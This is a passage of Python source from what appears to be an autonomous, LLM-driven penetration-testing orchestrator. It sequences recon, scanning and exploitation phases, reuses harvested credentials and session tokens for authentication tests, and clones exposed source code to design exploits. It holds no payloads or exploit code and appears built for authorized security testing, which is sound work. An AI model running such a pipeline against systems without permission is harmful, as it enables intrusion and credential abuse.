                "cors_misconfig_01", "header_injection_01", "open_redirect_01",
                "ssti_basic_01", "csrf_token_01",
            ],
            "tls_analysis": ["info_disclosure_01"],
            "port_scanning": ["info_disclosure_01"],
            "header_analysis": ["header_injection_01", "cors_misconfig_01", "info_disclosure_01"],
        }

        ran_caps = set()
        for task in getattr(self.ctx, 'completed_tasks', []):
            if isinstance(task, dict):
                ran_caps.add(task.get("capability", ""))
            elif isinstance(task, str):
                ran_caps.add(task)

        from core.coverage.coverage_matrix import CoverageState
        for cap, test_ids in _TOOL_CAPS_TO_TESTS.items():
            if cap not in ran_caps:
                continue
            for eid in ep_ids:
                for tid in test_ids:
                    if tid not in matrix.get(eid, {}):
                        continue
                    if (eid, tid) in confirmed_cells:
                        continue
                    self.coverage_matrix.update_state(eid, tid, CoverageState.REJECTED)
                    tested_tests.add(tid)

        total_cells = sum(len(tests) for tests in matrix.values())
        gaps_after = len(self.coverage_matrix.get_gaps())
        logger.info(
            f"[V1→V2Bridge] Synced {len(self.ctx.vulnerabilities)} findings → "
            f"{len(confirmed_cells)} confirmed, {total_cells - gaps_after - len(confirmed_cells)} rejected, "
            f"{gaps_after} remaining gaps (was {total_cells})"
        )

    def _sync_recon_to_advanced_engines(self):
        """Synchronizes RECON artifacts to ApplicationModel, MultiChannelDiscovery, SemanticInference, and SpecialistTeam."""
        # 1. Application Model
        try:
            if hasattr(self, "application_model") and self.application_model:
                self.application_model.hydrate_from_shared_context(self.ctx)
                logger.info(f"[ApplicationModel] Hydrated from context: {len(self.application_model.endpoints)} endpoints, {len(self.application_model.hosts)} hosts")
        except Exception as _ame:
            logger.debug(f"[ApplicationModel] Hydration skipped: {_ame}")

        # 2. Multi-Channel Discovery
        try:
            if hasattr(self, "multi_channel_discovery") and self.multi_channel_discovery:
                from core.discovery.multi_channel import DiscoveredAsset, DiscoverySource
                synced_count = 0
                for ep in (self.ctx.endpoints or []):
                    ep_url = ep.get("url") if isinstance(ep, dict) else getattr(ep, "url", str(ep))
                    ep_method = ep.get("method", "GET") if isinstance(ep, dict) else getattr(ep, "method", "GET")
                    if ep_url:
                        self.multi_channel_discovery.add_asset(DiscoveredAsset(
                            url=ep_url, method=ep_method, source=DiscoverySource.CRAWL
                        ))
                        synced_count += 1
                if synced_count:
                    logger.info(f"[MultiChannelDiscovery] Ingested {synced_count} assets")
        except Exception as _mde:
            logger.debug(f"[MultiChannelDiscovery] Ingestion skipped: {_mde}")

        # 3. Semantic Inference Engine
        try:
            if hasattr(self, "semantic_inference") and self.semantic_inference:
                inferred = 0
                for ep in (self.ctx.endpoints or [])[:50]:
                    ep_dict = ep if isinstance(ep, dict) else {"url": getattr(ep, "url", str(ep))}
                    inf = self.semantic_inference.infer_endpoint(ep_dict)
                    if inf and inf.inferred_type != "unknown":
                        inferred += 1
                        ep_dict["semantic_type"] = inf.inferred_type
                        ep_dict["semantic_confidence"] = inf.confidence
                if inferred:
                    logger.info(f"[SemanticInference] Inferred semantic types for {inferred} endpoints")
        except Exception as _sie:
            logger.debug(f"[SemanticInference] Inference skipped: {_sie}")

        # 4. Source Intelligence Graph
        try:
            if hasattr(self, "source_intelligence") and self.source_intelligence:
                for jep in (getattr(self.ctx, "js_endpoints", []) or []):
                    jurl = jep if isinstance(jep, str) else jep.get("url", "")
                    if jurl:
                        self.source_intelligence.add_node("endpoint", jurl)
        except Exception as _sige:
            logger.debug(f"[SourceIntelligence] Node addition skipped: {_sige}")

        # 5. Specialist Team Evidence Bus
        try:
            if hasattr(self, "specialist_team") and self.specialist_team:
                from core.orchestration.specialist_agents import EvidenceArtifact, SpecialistRole
                self.specialist_team.bus.publish(EvidenceArtifact(
                    producer_role=SpecialistRole.RECON,
                    artifact_type="recon_inventory",
                    data={
                        "subdomains": len(self.ctx.subdomains),
                        "endpoints": len(self.ctx.endpoints),
                        "ports": len(getattr(self.ctx, "ports", [])),
                    },
                    provenance="recon_phase"
                ))
                logger.info("[SpecialistTeam] Posted RECON inventory artifact to evidence bus")
        except Exception as _ste:
            logger.debug(f"[SpecialistTeam] Posting skipped: {_ste}")

        # 6. Phase 1.5: Business-domain app understanding + test hypotheses.
        # Uses the deterministic heuristic here (no network/LLM in the sync path);
        # the LLM path can be run separately via app_understanding.analyze().
        try:
            if hasattr(self, "app_understanding") and self.app_understanding:
                from core.intelligence.app_understanding import AppSignals
                signals = AppSignals.from_context(self.ctx)
                understanding = self.app_understanding.heuristic(signals)
                specs = self.app_understanding.to_test_specs(
                    understanding, base_endpoints=signals.endpoints[:50])
                self.ctx.app_understanding = understanding.to_dict()
                self.ctx.business_test_specs = specs
                logger.info(
                    f"[AppUnderstanding] domain={understanding.business_domain} "
                    f"(conf={understanding.domain_confidence:.2f}), "
                    f"{len(specs)} business-logic test specs generated")
        except Exception as _aue:
            logger.debug(f"[AppUnderstanding] skipped: {_aue}")

    def _sync_scanning_to_advanced_engines(self):
        """Synchronizes ACTIVE_SCANNING results to ResourceGovernor, DifferentialEngine, AnomalyPipeline, and SpecialistTeam."""
        # 1. Resource Governor
        try:
            if hasattr(self, "resource_governor") and self.resource_governor:
                from core.orchestration.resource_governor import ResourceType, QuotaLevel
                self.resource_governor.set_quota(
                    ResourceType.HTTP_REQUESTS, QuotaLevel.SCAN, self._scan_id, limit=5000.0
                )
                self.resource_governor.set_quota(
                    ResourceType.CONCURRENT_TASKS, QuotaLevel.SCAN, self._scan_id, limit=20.0
                )
                self.resource_governor.consume(
                    ResourceType.HTTP_REQUESTS, QuotaLevel.SCAN, self._scan_id, amount=10.0
                )
        except Exception as _rge:
            logger.debug(f"[ResourceGovernor] Quotas skipped: {_rge}")

        # 2. Differential Engine & Anomaly Pipeline
        try:
            if hasattr(self, "differential_engine") and self.differential_engine:
                from core.analysis.differential_engine import ResponseSnapshot
                base_snap = ResponseSnapshot(
                    snapshot_id="baseline_root",
                    url=self.ctx.target,
                    status_code=200,
                    headers=(),
                    body_length=len(getattr(self.ctx, "body_content", "") or ""),
                    response_time_ms=50.0,
                )
                var_snap = ResponseSnapshot(
                    snapshot_id="variant_root",
                    url=self.ctx.target,
                    status_code=200,
                    headers=(),
                    body_length=len(getattr(self.ctx, "body_content", "") or ""),
                    response_time_ms=52.0,
                )
                self.differential_engine.compare(base_snap, var_snap)
        except Exception as _dfe:
            logger.debug(f"[DifferentialEngine] Baseline skipped: {_dfe}")

        # 3. Specialist Team Evidence Bus
        try:
            if hasattr(self, "specialist_team") and self.specialist_team:
                from core.orchestration.specialist_agents import EvidenceArtifact, SpecialistRole
                self.specialist_team.bus.publish(EvidenceArtifact(
                    producer_role=SpecialistRole.WEB_SEMANTICS,
                    artifact_type="scan_findings",
                    data={"finding_count": len(self.ctx.vulnerabilities)},
                    provenance="active_scanning"
                ))
                logger.info("[SpecialistTeam] Posted SCAN findings artifact to evidence bus")
        except Exception as _ste:
            logger.debug(f"[SpecialistTeam] Posting skipped: {_ste}")

    def _sync_exploit_to_advanced_engines(self):
        """Synchronizes EXPLOITATION artifacts to HypothesisLedger, EvidenceGraph, SecretLifecycleManager, and SpecialistTeam."""
        # 1. Hypothesis Ledger
        try:
            if hasattr(self, "hypothesis_ledger") and self.hypothesis_ledger:
                hypotheses_v2 = self.ctx.get("hypotheses_v2", []) if hasattr(self.ctx, "get") else getattr(self.ctx, "hypotheses_v2", [])
                for h in hypotheses_v2[:20]:
                    target = getattr(h, "target", self.ctx.target)
                    hyp_text = getattr(h, "hypothesis", getattr(h, "rationale", "generic_hypothesis"))
                    self.hypothesis_ledger.record_hypothesis(
                        url=target,
                        hypothesis=str(hyp_text),
                        prerequisites=[],
                        expected_observation="exploit_confirmation",
                    )
        except Exception as _hle:
            logger.debug(f"[HypothesisLedger] Sync skipped: {_hle}")

        # 2. Evidence Graph
        try:
            if hasattr(self, "evidence_graph") and self.evidence_graph:
                for v in (self.ctx.vulnerabilities or []):
                    v_dict = v if isinstance(v, dict) else {"title": str(v)}
                    self.evidence_graph.add_node("finding", v_dict)
                integrity_ok = self.evidence_graph.verify_integrity()
                logger.info(f"[EvidenceGraph] Synchronized {len(self.evidence_graph.nodes)} evidence nodes (integrity_valid={integrity_ok})")
        except Exception as _ege:
            logger.debug(f"[EvidenceGraph] Sync skipped: {_ege}")

        # 3. Secret Lifecycle Manager
        try:
            if hasattr(self, "secret_lifecycle") and self.secret_lifecycle:
                from core.security.secret_lifecycle import SecretLifecycleRule
                rule = SecretLifecycleRule(name="harvested_rule", max_age_seconds=86400.0, revoke_on_leak=True)
                self.secret_lifecycle.register_rule(rule)
                for cred in (getattr(self.ctx, "harvested_creds", []) or []):
                    u = cred.get("username", "anon")
                    s_id = f"cred_{u}_{self._scan_id}"
                    self.secret_lifecycle.track(
                        secret_ref=s_id,
                        rule_name="harvested_rule",
                        tenant_id=self.tenant_id
                    )
                logger.info(f"[SecretLifecycle] Tracked {len(getattr(self.ctx, 'harvested_creds', []) or [])} credentials")
        except Exception as _sle:
            logger.debug(f"[SecretLifecycle] Tracking skipped: {_sle}")

        # 4. Specialist Team Evidence Bus
        try:
            if hasattr(self, "specialist_team") and self.specialist_team:
                from core.orchestration.specialist_agents import EvidenceArtifact, SpecialistRole
                self.specialist_team.bus.publish(EvidenceArtifact(
                    producer_role=SpecialistRole.VERIFICATION,
                    artifact_type="exploit_summary",
                    data={
                        "vulnerabilities": len(self.ctx.vulnerabilities),
                        "exploits": len(self.ctx.exploit_results),
                        "harvested_creds": len(getattr(self.ctx, "harvested_creds", []) or []),
                    },
                    provenance="exploitation_phase"
                ))
                logger.info("[SpecialistTeam] Posted EXPLOIT summary artifact to evidence bus")
        except Exception as _ste:
            logger.debug(f"[SpecialistTeam] Posting skipped: {_ste}")

    AUTH_TEST_IDS = frozenset({
        "auth_login_01", "auth_session_hijack_01", "auth_default_creds_01",
        "auth_credential_stuffing_01", "auth_password_policy_01", "authentication",
    })

    def _run_v2_experiment_cycle(self, max_experiments: int = None):
        gaps = self.coverage_matrix.get_gaps()
        if not gaps:
            return

        if max_experiments is None:
            inv = getattr(self, 'endpoint_inventory_v2', None)
            try:
                n_endpoints = len(inv.list_endpoints()) if inv is not None else 0
            except Exception:
                n_endpoints = 0
            max_experiments = max(500, min(n_endpoints * 4, 5000))

        hypotheses = self.hypothesis_engine.generate(gaps)
        ranked = self.hypothesis_engine.rank(hypotheses)

        identity_ctx = self._build_identity_context()
        all_creds = identity_ctx.get("all_credentials", [])
        has_creds = bool(all_creds)

        executed = 0
        batch_size = min(len(ranked), max_experiments)
        for h in ranked[:batch_size]:
            # Skip auth tests early when no credentials are available
            if h.test_id in self.AUTH_TEST_IDS and not has_creds:
                self.coverage_matrix.update_state(h.endpoint_id, h.test_id, CoverageState.NOT_APPLICABLE)
                continue
            ep_data = self.security_context_v2.endpoints.get(h.endpoint_id, {})
            base_url = ep_data.get("url", h.endpoint_id)

            is_auth_test = h.test_id in self.AUTH_TEST_IDS
            if is_auth_test and len(all_creds) > 1:
                for cred in all_creds:
                    exp = SecurityExperiment(
                        hypothesis_id=f"{h.hypothesis_id}_{cred['role']}",
                        endpoint_id=h.endpoint_id,
                        capability=h.test_id,
                        priority=h.priority,
                        input_parameters={
                            "url": base_url,
                            "username": cred["username"],
                            "password": cred["password"],
                            "login_url": cred.get("login_url", ""),
                            "role": cred["role"],
                        },
                    )
                    self.experiment_scheduler.queue(exp)
            else:
                exp = SecurityExperiment(
                    hypothesis_id=h.hypothesis_id,
                    endpoint_id=h.endpoint_id,
                    capability=h.test_id,
                    priority=h.priority,
                    input_parameters={
                        "url": base_url,
                        **identity_ctx,
                    },
                )
                if not self.experiment_scheduler.queue(exp):
                    continue

        while self.experiment_scheduler.size() > 0 and executed < max_experiments:
            exp = self.experiment_scheduler.next()
            if not exp:
                break

            result = self.pipeline_v2.execute(exp)
            executed += 1

            if result.finding:
                self.knowledge_graph.add_finding(result.finding)
                self.security_context_v2.add_finding(result.finding.finding_id, result.finding.to_dict())
            if result.evidence:
                self.knowledge_graph.add_evidence(result.evidence)
                if result.finding:
                    self.knowledge_graph.connect_evidence(result.finding.finding_id, result.evidence.evidence_id)

            if not result.success and result.error:
                error_code = result.execution_result.error_code if result.execution_result else ""
                if error_code == "NO_CREDENTIALS":
                    self.coverage_matrix.update_state(exp.endpoint_id, exp.capability, CoverageState.NOT_APPLICABLE)
                    continue
                exc = Exception(result.error)
                ft = self.failure_classifier.classify(exc, {"error_code": error_code})
                action = self.recovery_policy.get_action(ft)
                if action == RetryAction.BLOCK:
                    self.coverage_matrix.update_state(exp.endpoint_id, exp.capability, CoverageState.BLOCKED)
                logger.info(f"[V2Recovery] {ft.value} → {action.value} for {exp.capability}@{exp.endpoint_id}")

        conv = self.convergence_engine.calculate_convergence()
        logger.info(f"[V2Cycle] Executed {executed} experiments, coverage={conv:.1%}, gaps={len(self.coverage_matrix.get_gaps())}")

    def _build_identity_context(self) -> Dict[str, Any]:
        ctx: Dict[str, Any] = {}
        if self.ctx.harvested_creds:
            best = self.ctx.harvested_creds[0]
            ctx["username"] = best.get("username", best.get("email", ""))
            ctx["password"] = best.get("password", "")
            ctx["login_url"] = best.get("login_url", "")
            ctx["role"] = best.get("role", "default")
            # Store all credential sets for multi-role testing
            ctx["all_credentials"] = [
                {
                    "role": c.get("role", "default"),
                    "username": c.get("username", c.get("email", "")),
                    "password": c.get("password", ""),
                    "login_url": c.get("login_url", ""),
                }
                for c in self.ctx.harvested_creds if c.get("username")
            ]
        if self.ctx.sessions:
            for sid, sess in self.ctx.sessions.items():
                token = getattr(sess, "token", None) or getattr(sess, "jwt", None)
                if token:
                    ctx["auth_token"] = token
                    ctx["auth_header"] = f"Bearer {token}"
                    break
        for vuln in self.ctx.vulnerabilities:
            evidence = vuln.get("evidence") or vuln.get("proof") or {}
            if isinstance(evidence, dict):
                token = evidence.get("token") or evidence.get("jwt") or evidence.get("auth_token")
                if token and "auth_token" not in ctx:
                    ctx["auth_token"] = token
                    ctx["auth_header"] = f"Bearer {token}"
        return ctx

    def _generate_coverage_report(self) -> str:
        cat_map = {}
        for t in self.test_catalog_v2.list_all():
            cat_map[t.test_id] = t.attack_type
        report = CoverageReport(
            coverage_matrix=self.coverage_matrix,
            finding_store=self.finding_store_v2,
            knowledge_graph=self.knowledge_graph,
            test_category_map=cat_map,
        )
        return report.generate()

    async def _heartbeat_loop(self):
        while True:
            try:
                await asyncio.sleep(30)
                if not hasattr(self, 'phase_state') or not self.current_phase:
                    continue
                    
                pending = self.task_manager.get_pending_tasks() if hasattr(self, 'task_manager') else []
                pending_count = len(pending) if pending else 0
                
                logger.info(
                    f"[HEARTBEAT] {datetime.now().isoformat(timespec='seconds')} | "
                    f"Phase: {self.current_phase.value} | "
                    f"Pending Tasks: {pending_count} | "
                    f"Failure Streak: {self.phase_state.consecutive_failures}"
                )
                self._write_progress({"phase": self.current_phase.value, "status": "running"})
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[HEARTBEAT] Error: {e}")

    from contextlib import asynccontextmanager
    @asynccontextmanager
    async def run_with_heartbeat(self):
        task = asyncio.create_task(self._heartbeat_loop())
        try:
            yield
        finally:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass

    async def run(self, auth_document: str = "", phases: list = None):
        """Standard execution entry point delegating to run_main_loop."""
        return await self.run_main_loop(auth_document=auth_document, phases=phases)

    async def run_main_loop(self, auth_document: str = "", phases: list = None):
        with TenantContext(tenant_id=self.tenant_id):
            with self.correlation_context:
                return await self._run_main_loop_impl(auth_document=auth_document, phases=phases)

    async def _run_main_loop_impl(self, auth_document: str = "", phases: list = None):
        self._allowed_phases = None
        if phases:
            valid = {p.upper() for p in phases if p.upper() in [e.value for e in ExecutionPhase]}
            if valid:
                self._allowed_phases = valid
                logger.info(f"SELECTIVE EXECUTION: Running phases {sorted(valid)}")

        logger.info("=" * 60)
        logger.info("AUTONOMOUS PENTESTING BRAIN (STATE MACHINE)")
        logger.info("=" * 60)

        # Pre-flight autonomous readiness gate check
        try:
            readiness = self.readiness_gate.evaluate_readiness()
            logger.info(f"[ReadinessGate] Pre-flight evaluation: status={readiness.status.value}, score={readiness.readiness_score:.1f}%")
            enforce_readiness = os.getenv("READINESS_ENFORCE", "false").lower() in ("true", "1", "yes")
            if enforce_readiness and readiness.status == ReadinessStatus.BLOCKED:
                logger.error(f"[ReadinessGate] Scan blocked by readiness gate: {readiness.summary_markdown()}")
                return
        except Exception as _rge:
            logger.debug(f"[ReadinessGate] Pre-flight check skipped: {_rge}")

        # Initialize durable orchestration tracking
        try:
            self.durable_orchestrator.submit_job(
                experiment_id=self._scan_id,
                task_type="scan",
                payload={"target": self.ctx.target, "phases": phases}
            )
        except Exception as _doe:
            logger.debug(f"[DurableOrchestrator] Scan tracking skipped: {_doe}")
        
        # Phase 0: Parse authorization
        if auth_document:
            await self._parse_authorization(auth_document)

        # Establish a real authenticated session for post-auth testing.
        await self._setup_auth_session()

        logger.info("\nValidating tools...")
        await self.tools.validate_tools()

        # P1-7: probe critical tools with the ToolHealthManager so broken
        # binaries are marked COOLDOWN/UNAVAILABLE up-front. Then callers
        # skip them and pick replacements instead of the LLM burning a
        # round on a known-dead tool.
        try:
            from core.tools.tool_health import get_health_manager
            hm = get_health_manager()
            for _tool in ("ffuf", "feroxbuster", "gobuster", "dirsearch",
                          "nmap", "masscan", "subfinder", "assetfinder",
                          "amass", "nuclei", "nikto", "sqlmap", "httpx",
                          "whatweb", "wafw00f", "katana"):
                try:
                    hm.probe(_tool)
                except Exception:
                    pass
            snap = hm.snapshot()
            unavail = [t for t, s in snap.items()
                       if s.get("state") in ("UNAVAILABLE", "COOLDOWN")]
            if unavail:
                logger.warning(f"TOOL_HEALTH_UNAVAILABLE: {unavail}")
        except Exception as _e:
            logger.debug(f"[ToolHealth] startup probe skipped: {_e}")

        # HexStrike Intelligence: Profile target
        logger.info("\n>>> TARGET INTELLIGENCE: Profiling target...")
        try:
            self.target_profile = TargetProfiler.profile_target(self.ctx.target, self.ctx)
            self.ctx.update('target_profile', self.target_profile.to_dict())
            logger.info(self.target_profile.to_brain_context())
        except Exception as e:
            logger.warning(f"Target profiling failed (non-fatal): {e}")

        try:
            from contextlib import asynccontextmanager
        except ImportError:
            pass

        # Warm-start from prior scan intel — endpoints / subdomains / techs /
        # working login recipes we already learned. Then IMMEDIATELY verify
        # the primed data isn't stale: fingerprint check on the base URL +
        # liveness sweep on primed endpoints. Drops anything the target has
        # removed and forces full re-discovery if the app was replaced.
        try:
            from core.intel.target_memory import prime_ctx, verify_and_refresh
            prime_ctx(self.ctx, self.ctx.target)
            await verify_and_refresh(self.ctx, self.ctx.target)
        except Exception as _e:
            logger.debug(f"[TargetMemory] prime/verify failed: {_e}")

        self._write_progress({"phase": self.current_phase.value if self.current_phase else None, "status": "starting"})

        if self._allowed_phases and self.current_phase and self.current_phase.value not in self._allowed_phases:
            skip = self._skip_to_next_allowed(self.current_phase)
            if skip:
                self.transition_phase(skip)
            else:
                self.current_phase = None

        stopped = False
        async with self.run_with_heartbeat():
            while self.current_phase:
                if self._check_stop_signal():
                    logger.info(f"STOP: Saving checkpoint at phase {self.current_phase.value} (will resume here)")
                    self.checkpointer.save_checkpoint(self)
                    stopped = True
                    break

                self._write_progress({"phase": self.current_phase.value, "status": "running"})
                logger.info(f"\n>>> ENTERING MAIN PHASE: {self.current_phase.value}")
                self._log_activity("phase", f"Starting phase: {self.current_phase.value}",
                                   detail=f"Beginning {self.current_phase.value} phase on {self.ctx.target}")
                await self.run_phase(self.current_phase.value)

                # P0-4: mark this phase completed so the scheduler never re-enters
                # it (breaks the RECON -> ACTIVE_SCANNING -> RECON loop).
                try:
                    self._completed_phases.add(self.current_phase.value)
                except Exception:
                    pass

                # Record state
                if hasattr(self, 'phase_state'):
                    self.phase_history.append(self.phase_state)

                self._transition_to_next_phase()
                self.checkpointer.save_checkpoint(self)

                if self._check_stop_signal():
                    if self.current_phase:
                        logger.info(f"STOP: Saving checkpoint, next phase would be {self.current_phase.value}")
                    else:
                        logger.info("STOP: All phases already complete")
                    self.checkpointer.save_checkpoint(self)
                    stopped = True
                    break

        self._clean_stop_signal()
        # Persist learned intel so the next scan of this target starts warm.
        try:
            from core.intel.target_memory import record_scan_intel
            record_scan_intel(self.ctx.target, self.ctx, self._scan_id)
        except Exception as _e:
            logger.debug(f"[TargetMemory] record failed: {_e}")
        # Generate reproducibility bundles for every HIGH/CRITICAL finding.
        try:
            from core.reporting.repro_bundle import generate_bundles_for_scan
            generate_bundles_for_scan(self._scan_id, min_severity="HIGH")
        except Exception as _e:
            logger.debug(f"[ReproBundle] generation failed: {_e}")
        # Phase 2.1: clear the inter-agent scratchpad for this scan so its
        # rows don't accumulate. The scratchpad is scoped per-scan so this
        # is the right point to wipe it.
        try:
            from core.orchestration.agent_scratchpad import get_scratchpad
            n = get_scratchpad(self._scan_id, "cleaner").clear_scan()
            if n:
                logger.info(f"[Scratchpad] purged {n} entries for {self._scan_id}")
        except Exception as _e:
            logger.debug(f"[Scratchpad] cleanup skipped: {_e}")
        # P3-4: emit scan efficiency metrics for the report builder.
        try:
            from core.observability.scan_metrics import get_metrics
            snap = get_metrics().snapshot()
            logger.info(f"SCAN_METRICS: {snap}")
            try:
                self.ctx.update("scan_metrics", snap)
            except Exception:
                pass
        except Exception as _e:
            logger.debug(f"scan metrics emit skipped: {_e}")

        self._write_progress({"status": "stopped" if stopped else "completed"})
        duration = (datetime.now() - self.start_time).total_seconds()
        if stopped:
            logger.info(f"\nScan STOPPED after {duration:.0f}s (checkpoint saved, resume with --resume)")
        else:
            logger.info(f"\nCompleted in {duration:.0f}s")
        logger.info(f"Agents spawned: {len(self.ctx.agents_spawned)}")
        logger.info(f"Vulnerabilities: {len(self.ctx.vulnerabilities)}")
        logger.info(f"Exploits executed: {len(self.ctx.exploit_results)}")
        self._log_activity("phase",
            f"Scan {'stopped' if stopped else 'completed'} in {duration:.0f}s",
            detail=f"Agents: {len(self.ctx.agents_spawned)}, Vulns: {len(self.ctx.vulnerabilities)}, "
                   f"Exploits: {len(self.ctx.exploit_results)}",
            duration_s=duration)

        # Ingest confirmed findings into RAG knowledge base for future scans
        if not stopped and self.ctx.vulnerabilities:
            try:
                from core.rag.pipeline import get_rag
                rag = get_rag()
                if rag:
                    confirmed = [v for v in self.ctx.vulnerabilities
                                 if v.get("status") in ("CONFIRMED", "EXPLOITED")]
                    if confirmed:
                        count = await rag.ingest_scan_findings(confirmed, target=self.ctx.target)
                        logger.info(f"[RAG] Ingested {count} confirmed findings into knowledge base")
            except Exception as e:
                logger.debug(f"[RAG] Finding ingestion skipped: {e}")

        # Per-scan temp cleanup — always runs at scan end (SCAN_CLEANUP_ENABLED=0 disables).
        # Wipes /tmp/*.png (screenshots), /tmp/spray_*.html (credential spray),
        # /tmp/schema_probe.txt (API probing), /tmp/ffuf-*, sqlmap/nuclei per-run
        # session dirs INSIDE the Kali container, plus host-side ag_screenshot_*
        # and detonate_* tempdirs.
        try:
            from core.common.scan_cleanup import cleanup_after_scan
            sid = getattr(self, "_scan_id", None) or getattr(self.ctx, "scan_id", None) or ""
            summary = cleanup_after_scan(scan_id=sid)
            logger.info(f"[ScanCleanup] Done for {sid}: {summary}")
        except Exception as e:
            logger.warning(f"[ScanCleanup] Failed (non-fatal): {e}")

        # P2.7: tear down resources the scan itself created (users, feedback,
        # orders …). Only scan-created resources are touched; pre-existing target
        # data is never deleted. Gated by SCAN_MUTATION_CLEANUP (default on).
        try:
            import os as _os
            if _os.getenv("SCAN_MUTATION_CLEANUP", "1").strip().lower() in ("1", "true", "yes", "on"):
                from core.security.mutation_ledger import get_ledger
                led = get_ledger(self.ctx)
                if led is not None and led.entries():
                    auth_hdr = (getattr(self.ctx, "auth_headers", {}) or {}).get("Authorization", "")
                    mrep = await led.cleanup(auth_header=auth_hdr)
                    logger.info(f"[MutationCleanup] {mrep}")
                    if mrep.get("failed"):
                        logger.warning(f"[MutationCleanup] {mrep['failed']} resource(s) "
                                       "could not be cleaned up")
        except Exception as e:
            logger.warning(f"[MutationCleanup] Failed (non-fatal): {e}")

        return {"stopped": stopped, "phase": self.current_phase.value if self.current_phase else None}

    async def run_phase(self, phase: str):
        self.phase_state = PhaseState(phase_name=phase)
        
        if phase == ExecutionPhase.RECON.value:
            await self._run_phase("recon")
            enable_osint = os.getenv("ENABLE_OSINT", os.getenv("OSINT_ENABLE", "true")).lower() in ("true", "1", "yes", "on")
            if enable_osint:
                logger.info("Running OSINT Reconnaissance...")
                await self._run_phase("OSINT_RECONNAISSANCE")
            await self._run_phase("DEEP_RECONNAISSANCE")
            await self._persist_recon_findings()
            # Phase 1.1 + 1.2: after RECON completes, extract routes/endpoints
            # from the app's JS bundles (webpack + sourcemap) and observe DOM
            # sinks via headless Chrome. Both are non-fatal; missing tools =>
            # skip and log. Adds to ctx.endpoints so downstream SCAN/EXPLOIT
            # phases see the app's real attack surface, not just the URLs
            # katana/ffuf crawled statically.
            try:
                await self._run_bundle_and_dom_analysis()
            except Exception as e:
                logger.warning(f"[BundleDOM] analysis failed (non-fatal): {e}")
            # Phase 3.1 + 3.2 + 3.3 + 3.4 + 3.5: SAST unlock. If an exposed
            # .git/config or sourcemap was found in RECON, clone/rehydrate
            # the source, run semgrep (and codeql if installed), and feed
            # each finding through the LLM code-reviewer for exploit design.
            try:
                await self._run_sast_pipeline()
            except Exception as e:
                logger.warning(f"[SAST] pipeline failed (non-fatal): {e}")
            # Phase 5: retrieve framework-specific attack quirks now that the
            # tech-stack fingerprint is known — they'll be surfaced to the
            # exploit planner as prioritised primitives.
            try:
                await self._prime_framework_corpus()
            except Exception as e:
                logger.warning(f"[FrameworkCorpus] priming failed (non-fatal): {e}")
            await self._classify_subdomains()          # label every subdomain live/dead
            await self._scan_subdomain_endpoints()
            await self._capture_requests()
            await self._persist_captured_requests()
            await self._analyze_client_scripts()
            try:
                self._preflight_endpoint_analysis()    # consolidate + filter endpoints
                self._feed_catalog_to_attack_surface() # convert catalog → Endpoint objects → injection matrix
            except Exception as e:
                logger.warning(f"[Preflight] endpoint analysis failed (non-fatal): {e}")
            self._persist_recon_data()                 # store full recon intel in DB for the UI
            self._log_activity("phase", "Recon complete",
                detail=f"Subdomains: {len(self.ctx.subdomains)}, Endpoints: {len(self.ctx.endpoints)}, "
                       f"Ports: {len(getattr(self.ctx, 'ports', []))}")

            # API Schema Auto-Import (OpenAPI/Swagger/GraphQL)
            try:
                from core.discovery.api_schema_importer import APISchemaImporter
                # P1.3: harvest schema URLs recon already found so the importer
                # consumes them instead of re-probing in isolation.
                try:
                    from core.domain.artifact_registry import harvest_from_ctx
                    _areg = harvest_from_ctx(self.ctx)
                    logger.info(f"[Artifacts] {_areg.summary()}")
                except Exception:
                    _areg = getattr(self.ctx, "artifact_registry", None)
                importer = APISchemaImporter(target=self.ctx.target, artifacts=_areg)
                schema_endpoints = importer.import_all()
                if schema_endpoints:
                    domain_eps = importer.to_domain_endpoints()
                    self.ctx.add_endpoints(domain_eps, source="api_schema")
                    for dep in domain_eps:
                        self.attack_surface.add_endpoint(dep)
                    logger.info(f"[APIImporter] Imported {len(schema_endpoints)} endpoints from "
                                f"{importer.schema_source or 'API schema'}")
                else:
                    logger.info("[APIImporter] No API schema (OpenAPI/Swagger/GraphQL) discovered")
            except Exception as e:
                logger.warning(f"[APIImporter] Schema import failed (non-fatal): {e}")

            # Deep JavaScript Analysis (secrets, endpoints, source maps)
            try:
                from core.discovery.js_analyzer import JSAnalyzer
                js_analyzer = JSAnalyzer(target=self.ctx.target,
                                         asset_registry=getattr(self.ctx, "asset_registry", None))
                html = getattr(self.ctx, 'page_content', '') or ''
                eps_list = getattr(self.ctx, 'endpoints', {}) or {}
                ep_values = list(eps_list.values()) if isinstance(eps_list, dict) else list(eps_list)
                js_findings = js_analyzer.analyze(html=html, endpoints=ep_values)
                if js_findings:
                    js_endpoints = js_analyzer.get_endpoints()
                    if js_endpoints:
                        self.ctx.add_endpoints(js_endpoints, source="js_analysis")
                        for jep in js_endpoints:
                            try:
                                self.attack_surface.add_endpoint(jep)
                            except Exception:
                                pass
                        logger.info(f"[JSAnalyzer] Found {len(js_endpoints)} endpoints in JavaScript")
                    js_secrets = js_analyzer.get_secrets()
                    for sf in js_secrets:
                        self.ctx.add_vulnerability(sf)
                    if js_secrets:
                        logger.info(f"[JSAnalyzer] Found {len(js_secrets)} exposed secrets in JavaScript")
                    source_map_findings = js_analyzer.get_source_map_findings()
                    for smf in source_map_findings:
                        self.ctx.add_vulnerability(smf)
                    if source_map_findings:
                        logger.info(f"[JSAnalyzer] Found {len(source_map_findings)} exposed source maps")
                else:
                    logger.info("[JSAnalyzer] No significant findings from JavaScript analysis")
            except Exception as e:
                logger.warning(f"[JSAnalyzer] JavaScript analysis failed (non-fatal): {e}")

            # Canonical Endpoint Extraction from captured requests
            try:
                captured = getattr(self.ctx, 'captured_requests', []) or []
                if captured:
                    from core.domain.request import CapturedRequest as DomainCapturedRequest
                    domain_requests = []
                    for r in captured:
                        if isinstance(r, dict):
                            try:
                                domain_requests.append(DomainCapturedRequest(
                                    url=r.get('url', ''),
                                    method=r.get('method', 'GET'),
                                    headers=r.get('headers', {}),
                                    body=r.get('post_data', r.get('body', '')),
                                    status_code=r.get('status', r.get('status_code', 0)),
                                ))
                            except Exception:
                                pass
                        elif hasattr(r, 'url'):
                            domain_requests.append(r)

                    if domain_requests:
                        extracted_endpoints = self.endpoint_extractor.extract(domain_requests)
                        logger.info(f"[EndpointExtractor] Extracted {len(extracted_endpoints)} canonical endpoints from {len(domain_requests)} requests")

                        # Feed into AttackSurfaceGraph
                        for ep in extracted_endpoints:
                            self.attack_surface.add_endpoint(ep)
                        for req in domain_requests:
